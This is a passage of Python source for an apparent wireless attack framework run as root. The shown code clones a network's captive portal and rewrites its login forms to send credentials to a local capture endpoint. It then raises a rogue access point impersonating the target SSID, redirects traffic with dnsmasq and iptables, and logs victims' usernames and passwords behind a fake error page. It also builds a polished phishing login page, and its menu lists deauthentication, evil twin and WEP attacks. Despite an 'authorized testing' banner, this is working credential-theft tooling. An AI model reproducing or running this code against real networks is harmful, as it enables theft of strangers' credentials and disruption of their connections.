            'http://connectivitycheck.gstatic.com/generate_204',
            'http://www.msftconnecttest.com/connecttest.txt'
        ]

        try:
            import urllib.request
            for url in detection_urls:
                try:
                    response = urllib.request.urlopen(url, timeout=5)
                    # If we get redirected, that's likely the captive portal
                    if response.geturl() != url:
                        return response.geturl()
                except:
                    continue

            # Fallback: try to get default gateway
            result = subprocess.run(['ip', 'route', 'show', 'default'],
                                capture_output=True, text=True)
            if result.stdout:
                # Extract gateway IP
                match = re.search(r'default via ([\d.]+)', result.stdout)
                if match:
                    gateway = match.group(1)
                    return f"http://{gateway}"
        except:
            pass

        return None
    def clone_portal_wget(self, url, output_dir):
        """Clone captive portal using wget"""
        try:
            clone_path = output_dir / 'cloned'
            clone_path.mkdir(exist_ok=True)

            print(f"Cloning portal: {url}")

            cmd = [
                'wget',
                '--recursive',
                '--level=3',
                '--page-requisites',
                '--adjust-extension',
                '--convert-links',
                '--no-parent',
                '--no-host-directories',
                '--directory-prefix', str(clone_path),
                '--timeout=20',
                '--tries=2',
                url
            ]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

            html_files = list(clone_path.glob('**/*.html'))
            if html_files:
                print(f"Cloned {len(html_files)} pages with assets")
                return True

            return False

        except Exception as e:
            print(f"Clone error: {e}")
            return False

    def modify_portal_forms(self, portal_dir):
        """Modify HTML forms in cloned portal to capture credentials"""
        import re
        from bs4 import BeautifulSoup

        clone_path = portal_dir / 'cloned'

        # Get all HTML files, but filter out directories and special HTTrack files
        html_files = []
        for pattern in ['**/*.html', '**/*.htm']:
            for file_path in clone_path.glob(pattern):
                # Skip if it's a directory or special HTTrack index files
                if file_path.is_file() and file_path.name not in ['*.html', '*.htm', 'index.html~']:
                    html_files.append(file_path)

        if not html_files:
            print("No valid HTML files found to modify")
            return

        modified_count = 0

        for html_file in html_files:
            try:
                with open(html_file, 'r', encoding='utf-8', errors='ignore') as f:
                    soup = BeautifulSoup(f.read(), 'html.parser')

                # Find all forms
                forms = soup.find_all('form')

                for form in forms:
                    # Look for login forms (forms with password fields)
                    inputs = form.find_all('input')
                    has_password = any(inp.get('type') == 'password' for inp in inputs)
                    has_text_or_email = any(inp.get('type') in ['text', 'email', None] for inp in inputs)

                    if has_password and has_text_or_email:
                        # Modify form to POST to our capture endpoint
                        form['action'] = '/capture_credentials'
                        form['method'] = 'post'

                        modified_count += 1

                # Write modified HTML
                with open(html_file, 'w', encoding='utf-8') as f:
                    f.write(str(soup))

            except Exception as e:
                print(f"Error modifying {html_file.name}: {e}")
                continue

        print(f"Modified {modified_count} forms across {len(html_files)} files")

    def launch_rogue_ap_with_portal(self, portal_dir, portal_subdir='cloned'):
        """Launch rogue AP with captive portal infrastructure"""
        import http.server
        import socketserver
        from threading import Thread

        if not self.target_network:
            print("No target network selected")
            return

        # Check if port 80 is in use
        port_check = subprocess.run(['sudo', 'lsof', '-i', ':80'],
                                    capture_output=True, text=True)
        if port_check.stdout:
            print("\nPort 80 is already in use:")
            print(port_check.stdout)
            print("\nAttempting to free port 80...")

            # Common services that use port 80
            for service in ['apache2', 'nginx', 'lighttpd', 'httpd']:
                subprocess.run(['sudo', 'systemctl', 'stop', service],
                            capture_output=True)

            time.sleep(2)

        # Check if port 53 (DNS) is in use
        dns_check = subprocess.run(['sudo', 'lsof', '-i', ':53'],
                                capture_output=True, text=True)
        if dns_check.stdout:
            print("\nPort 53 (DNS) is already in use:")
            print(dns_check.stdout)
            print("\nStopping conflicting DNS services...")

            # Stop systemd-resolved or other DNS services
            subprocess.run(['sudo', 'systemctl', 'stop', 'systemd-resolved'],
                        capture_output=True)
            subprocess.run(['sudo', 'pkill', 'dnsmasq'], capture_output=True)

            time.sleep(2)

        clone_path = portal_dir / portal_subdir

        # Find the main index file
        index_file = None
        for name in ['index.html', 'index.htm', 'login.html', 'portal.html']:
            potential = list(clone_path.glob(f'**/{name}'))
            if potential:
                index_file = potential[0]
                break

        if not index_file:
            # Just use first HTML file found
            html_files = [f for f in clone_path.glob('**/*.html') if f.is_file()]
            if html_files:
                index_file = html_files[0]
            else:
                print("No HTML files found in cloned portal")
                return

        web_root = index_file.parent

        # Create credential log file
        creds_file = portal_dir / f'captive_portal_creds_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'

        # Custom HTTP handler for credential capture
        class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory=str(web_root), **kwargs)

            def do_POST(self):
                if self.path == '/capture_credentials':
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length).decode('utf-8')

                    # Parse credentials
                    from urllib.parse import parse_qs
                    params = parse_qs(post_data)

                    # Extract username/password
                    username = ''
                    password = ''

                    for key, value in params.items():
                        key_lower = key.lower()
                        if any(x in key_lower for x in ['user', 'email', 'login', 'id']):
                            username = value[0] if value else ''
                        elif any(x in key_lower for x in ['pass', 'pwd']):
                            password = value[0] if value else ''

                    # Log credentials
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    client_ip = self.client_address[0]
                    user_agent = self.headers.get('User-Agent', 'Unknown')

                    log_entry = f"""
    {'='*70}
    Timestamp: {timestamp}
    SSID: {self.server.target_ssid}
    Client IP: {client_ip}
    User-Agent: {user_agent}
    Username: {username}
    Password: {password}
    {'='*70}
    """

                    with open(self.server.creds_file, 'a') as f:
                        f.write(log_entry)

                    print(f"\n[CAPTURED] {username}:{password} from {client_ip}")

                    # Send fake error response
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    error_html = '''
                    <html><body>
                    <h2>Authentication Failed</h2>
                    <p>Invalid credentials. Please try again.</p>
                    <a href="/">Back to login</a>
                    </body></html>
                    '''
                    self.wfile.write(error_html.encode())
                else:
                    self.send_error(404)

            def log_message(self, format, *args):
                # Suppress normal HTTP logs
                pass

        # Start services
        processes = []
        httpd = None

        try:
            # 1. Create dnsmasq config
            dnsmasq_conf = portal_dir / 'dnsmasq.conf'
            with open(dnsmasq_conf, 'w') as f:
                f.write(f'''interface=at0
            bind-interfaces
            dhcp-range=192.168.1.100,192.168.1.200,12h
            dhcp-option=3,192.168.1.1
            dhcp-option=6,192.168.1.1
            no-resolv
            no-poll
            port=0
            ''')

            # 2. Start airbase-ng (rogue AP)
            print("Starting rogue AP...")
            airbase_cmd = [
                'sudo', self.tool_paths['airbase-ng'],
                '-e', self.target_network['essid'],
                '-c', self.target_network['channel'],
                self.selected_interface
            ]

            airbase_proc = subprocess.Popen(airbase_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            processes.append(('airbase-ng', airbase_proc))
            time.sleep(3)
            print("\n" * 2)

            # 3. Configure at0 interface
            print("Configuring network...")
            subprocess.run(['sudo', 'ip', 'link', 'set', 'at0', 'up'], check=True)
            subprocess.run(['sudo', 'ip', 'addr', 'add', '192.168.1.1/24', 'dev', 'at0'], check=True)

            # 4. Start dnsmasq
            print("Starting DHCP/DNS server...")
            dnsmasq_cmd = [
                'sudo', self.tool_paths['dnsmasq'],
                '-C', str(dnsmasq_conf),
                '--no-daemon',
                '--log-dhcp',  # Add DHCP logging
                '--log-queries'  # Add DNS logging
            ]
            dnsmasq_proc = subprocess.Popen(dnsmasq_cmd)  # Remove DEVNULL to see output
            processes.append(('dnsmasq', dnsmasq_proc))
            time.sleep(2)

            # Verify at0 is configured
            print("Verifying at0 interface...")
            result = subprocess.run(['ip', 'addr', 'show', 'at0'], capture_output=True, text=True)
            print(result.stdout)

            # 5. Set up iptables for NAT and port forwarding
            print("Configuring firewall rules...")
            # Redirect all HTTP traffic to our web server
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', 'at0',
                        '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', '192.168.1.1:80'],
                        capture_output=True)

            # Allow forwarding from at0
            subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-i', 'at0', '-j', 'ACCEPT'],
                        capture_output=True)

            # Enable IP forwarding
            subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'],
                        capture_output=True)

            # 6. Start web server
            print("Starting captive portal web server...")
            PORT = 80

            httpd = socketserver.TCPServer(("192.168.1.1", PORT), CaptivePortalHandler)
            httpd.target_ssid = self.target_network['essid']
            httpd.creds_file = creds_file

            print(f"\n{'='*70}")
            print("ROGUE AP ACTIVE")
            print(f"{'='*70}")
            print(f"SSID: {self.target_network['essid']}")
            print(f"Portal: http://192.168.1.1")
            print(f"Credentials logged to: {creds_file}")
            print(f"\nWaiting for clients to connect...")
            print("Press Ctrl+C to stop")
            print(f"{'='*70}\n")
            sys.stdout.flush()

            httpd.serve_forever()

        except KeyboardInterrupt:
            print("\n\nStopping services...")
        except Exception as e:
            print(f"\nError: {e}")
        finally:
            # Cleanup
            print("Cleaning up...")

            # Stop web server
            if httpd:
                try:
                    httpd.shutdown()
                    httpd.server_close()
                    print("Stopped web server")
                except:
                    pass

            # Stop processes
            for name, proc in processes:
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                    print(f"Stopped {name}")
                except:
                    try:
                        proc.kill()
                        proc.wait(timeout=2)
                    except:
                        pass

            # Clean up iptables rules
            print("Removing firewall rules...")
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', 'at0',
                        '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', '192.168.1.1:80'],
                        capture_output=True)
            subprocess.run(['sudo', 'iptables', '-D', 'FORWARD', '-i', 'at0', '-j', 'ACCEPT'],
                        capture_output=True)
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'], capture_output=True)
            subprocess.run(['sudo', 'iptables', '-F', 'FORWARD'], capture_output=True)

            # Remove at0 interface
            print("Removing at0 interface...")
            subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', 'at0'], capture_output=True)
            subprocess.run(['sudo', 'ip', 'link', 'set', 'at0', 'down'], capture_output=True)
            subprocess.run(['sudo', 'ip', 'link', 'delete', 'at0'], capture_output=True)

            # Reset attack interface from PROMISC mode
            print(f"Resetting {self.selected_interface}...")
            subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'promisc', 'off'],
                        capture_output=True)
            subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'down'],
                        capture_output=True)
            subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'mode', 'managed'],
                        capture_output=True)
            subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'up'],
                        capture_output=True)

            # Remove dnsmasq config file
            try:
                dnsmasq_conf = portal_dir / 'dnsmasq.conf'
                if dnsmasq_conf.exists():
                    dnsmasq_conf.unlink()
            except:
                pass

            print("Rogue AP cleanup complete")

    def default_captive_portal(self):
        """Use default captive portal"""
        print("\n" + "="*60)
        print("DEFAULT CAPTIVE PORTAL")
        print("="*60)

        # Prompt for SSID name
        if self.target_network and self.target_network['essid'] != '[Hidden]':
            default_ssid = self.target_network['essid']
            prompt = f"Enter SSID for rogue AP (default: {default_ssid}): "
        else:
            default_ssid = "Free_WiFi"
            prompt = "Enter SSID for rogue AP (default: Free_WiFi): "

        target_ssid = input(prompt).strip() or default_ssid

        portal_dir = Path(f"./captive_portals/{target_ssid.replace(' ', '_')}_default")
        portal_dir.mkdir(parents=True, exist_ok=True)

        print(f"\nCreating portal for SSID: {target_ssid}")

        # Create the default portal
        portal_html_dir = self.create_default_portal(portal_dir, target_ssid)

        print("\nStarting infrastructure:")
        print("  - Rogue AP (airbase-ng)")
        print("  - DHCP server (dnsmasq)")
        print("  - DNS redirect")
        print("  - Web server (Python)")
        print("\nPress Ctrl+C to stop all services\n")

        input("Press Enter to start, or Ctrl+C to cancel...")

        # Update target_network with the chosen SSID for the rogue AP
        if not self.target_network:
            self.target_network = {
                'essid': target_ssid,
                'channel': '6',
                'bssid': '00:00:00:00:00:00'
            }
        else:
            self.target_network['essid'] = target_ssid

        # Use the same launch method, just with different portal directory
        self.launch_rogue_ap_with_portal(portal_dir, portal_subdir='default_portal')

    def create_default_portal(self, portal_dir, ssid):
        """Create a professional default captive portal"""

        # Create portal directory structure
        portal_html_dir = portal_dir / 'default_portal'
        portal_html_dir.mkdir(parents=True, exist_ok=True)

        # Create a professional-looking captive portal HTML
        html_content = f'''<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>WiFi Login - {ssid}</title>
        <style>
            * {{
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }}

            body {{
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
            }}

            .container {{
                background: white;
                border-radius: 12px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                max-width: 400px;
                width: 100%;
                padding: 40px;
            }}

            .logo {{
                text-align: center;
                margin-bottom: 30px;
            }}

            .wifi-icon {{
                width: 80px;
                height: 80px;
                margin: 0 auto 20px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 40px;
                color: white;
            }}

            h1 {{
                color: #333;
                font-size: 24px;
                text-align: center;
                margin-bottom: 10px;
            }}

            .network-name {{
                text-align: center;
                color: #667eea;
                font-weight: 600;
                font-size: 18px;
                margin-bottom: 30px;
            }}

            .welcome-text {{
                text-align: center;
                color: #666;
                margin-bottom: 30px;
                line-height: 1.5;
            }}

            .form-group {{
                margin-bottom: 20px;
            }}

            label {{
                display: block;
                color: #333;
                font-weight: 500;
                margin-bottom: 8px;
                font-size: 14px;
            }}

            input {{
                width: 100%;
                padding: 12px 15px;
                border: 2px solid #e0e0e0;
                border-radius: 6px;
                font-size: 15px;
                transition: border-color 0.3s;
            }}

            input:focus {{
                outline: none;
                border-color: #667eea;
            }}

            button {{
                width: 100%;
                padding: 14px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                border: none;
                border-radius: 6px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: transform 0.2s, box-shadow 0.2s;
            }}

            button:hover {{
                transform: translateY(-2px);
                box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
            }}

            button:active {{
                transform: translateY(0);
            }}

            .terms {{
                text-align: center;
                margin-top: 20px;
                font-size: 12px;
                color: #999;
            }}

            .terms a {{
                color: #667eea;
                text-decoration: none;
            }}

            .footer {{
                text-align: center;
                margin-top: 30px;
                padding-top: 20px;
                border-top: 1px solid #e0e0e0;
                color: #999;
                font-size: 12px;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">
                <div class="wifi-icon">📶</div>
                <h1>WiFi Access</h1>
                <div class="network-name">{ssid}</div>
            </div>

            <div class="welcome-text">
                Welcome! Please sign in to access the internet.
            </div>

            <form action="/capture_credentials" method="post">
                <div class="form-group">
                    <label for="username">Email or Username</label>
                    <input type="text" id="username" name="username" required placeholder="Enter your email">
                </div>

                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required placeholder="Enter your password">
                </div>

                <button type="submit">Connect to WiFi</button>
            </form>

            <div class="terms">
                By connecting, you agree to our <a href="#">Terms of Service</a>
            </div>

            <div class="footer">
                Secure WiFi Connection
            </div>
        </div>
    </body>
    </html>'''

        # Write the HTML file
        index_file = portal_html_dir / 'index.html'
        with open(index_file, 'w', encoding='utf-8') as f:
            f.write(html_content)

        print(f"Default portal created at: {portal_html_dir}")
        return portal_html_dir

    def cleanup_and_restore_interfaces(self):
        """Restore interfaces and network services on exit"""
        print("\n" + "="*60)
        print("RESTORING NETWORK INTERFACES")
        print("="*60)

        try:
            # Kill any lingering attack processes first
            print("Stopping attack processes...")
            attack_processes = [
                'airbase-ng', 'airodump-ng', 'aireplay-ng',
                'mdk3', 'hostapd', 'dnsmasq'
            ]

            for proc in attack_processes:
                subprocess.run(['sudo', 'pkill', '-9', proc],
                            capture_output=True, stderr=subprocess.DEVNULL)

            time.sleep(1)

            # Clean up virtual interfaces
            print("Removing virtual interfaces...")
            virtual_ifaces = ['at0', 'mon0']
            for viface in virtual_ifaces:
                subprocess.run(['sudo', 'ip', 'link', 'delete', viface],
                            capture_output=True, stderr=subprocess.DEVNULL)

            # Clean up iptables rules
            print("Cleaning firewall rules...")
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'],
                        capture_output=True)
            subprocess.run(['sudo', 'iptables', '-F', 'FORWARD'],
                        capture_output=True)
            subprocess.run(['sudo', 'iptables', '-X'],
                        capture_output=True)

            if not self.selected_interface:
                print("No interface was selected.")
            else:
                print(f"Resetting {self.selected_interface}...")

                # Check if interface exists
                result = subprocess.run(['ip', 'link', 'show', self.selected_interface],
                                    capture_output=True)
                if result.returncode != 0:
                    print(f"Interface {self.selected_interface} not found, skipping reset")
                else:
                    # Turn off promiscuous mode
                    subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'promisc', 'off'],
                                capture_output=True, stderr=subprocess.DEVNULL)

                    # Bring interface down
                    subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'down'],
                                capture_output=True)

                    time.sleep(1)

                    # Reset to managed mode
                    subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'mode', 'managed'],
                                capture_output=True, stderr=subprocess.DEVNULL)

                    # Remove any manual IP addresses
                    subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', self.selected_interface],
                                capture_output=True)

                    # Bring interface back up
                    subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'up'],
                                capture_output=True)

                    time.sleep(2)

            # Restart system DNS services
            print("Restarting system services...")

            # Restart systemd-resolved (if it was stopped)
            subprocess.run(['sudo', 'systemctl', 'start', 'systemd-resolved'],
                        capture_output=True, stderr=subprocess.DEVNULL)

            # Restart NetworkManager (use restart instead of start)
            subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'],
                        capture_output=True)

            time.sleep(2)

            # Verify interface is back in managed mode
            if self.selected_interface:
                result = subprocess.run(['iwconfig', self.selected_interface],
                                    capture_output=True, text=True)
                if 'Mode:Managed' in result.stderr or 'Mode:Managed' in result.stdout:
                    print(f"✓ {self.selected_interface} restored to managed mode")
                else:
                    print(f"⚠ {self.selected_interface} may not be in managed mode")

                # Check NetworkManager control
                nm_check = subprocess.run(['nmcli', 'device', 'status'],
                                        capture_output=True, text=True)
                if self.selected_interface in nm_check.stdout:
                    for line in nm_check.stdout.split('\n'):
                        if self.selected_interface in line:
                            print(f"  NetworkManager status: {line.strip()}")
                            break

            print("\nInterface restoration complete")

        except Exception as e:
            print(f"Cleanup error: {e}")

    def get_all_wireless_interfaces(self):
        """Get all wireless interfaces (not just available ones)"""
        interfaces = []
        net_path = Path('/sys/class/net')

        if net_path.exists():
            for iface_dir in net_path.iterdir():
                if (iface_dir / 'wireless').exists():
                    interfaces.append(iface_dir.name)

        return sorted(set(interfaces))

    def run(self):
        """Main program loop"""
        print("WIRELESS ATTACK FRAMEWORK")
        print("FOR AUTHORIZED SECURITY TESTING ONLY")
        print("="*60)

        try:
            # Select interface
            if not self.select_interface():
                return

            # Select target
            if not self.select_target_network():
                return

            # Main menu loop
            while True:
                try:
                    self.display_attack_menu()
                    choice = input("\nSelect attack (1-11): ").strip()

                    if choice == '1':
                        self.deauth_attack()
                    elif choice == '2':
                        self.dos_attacks_menu()
                    elif choice == '3':
                        self.evil_twin_attack()
                    elif choice == '4':
                        self.karma_attack()
                    elif choice == '5':
                        self.captive_portal_attack()
                    elif choice == '6':
                        self.pmkid_capture()
                    elif choice == '7':
                        self.wpa_handshake_capture()
                    elif choice == '8':
                        self.wep_attacks_menu()
                    elif choice == '9':
                        self.select_target_network()
                    elif choice == '10':
                        self.select_interface()
                    elif choice == '11':
                        print("\nExiting...")
                        break
                    else:
                        print("Invalid selection.")

                except KeyboardInterrupt:
                    print("\n\nExiting...")
                    break

        finally:
            # Always cleanup on exit
            self.cleanup_and_restore_interfaces()

def main():
    if os.geteuid() != 0:
        print("This tool requires root privileges.")
        print("Run with: sudo python3 attack_framework.py")
        sys.exit(1)

    framework = WirelessAttackFramework()
    framework.run()

if __name__ == "__main__":
    main()
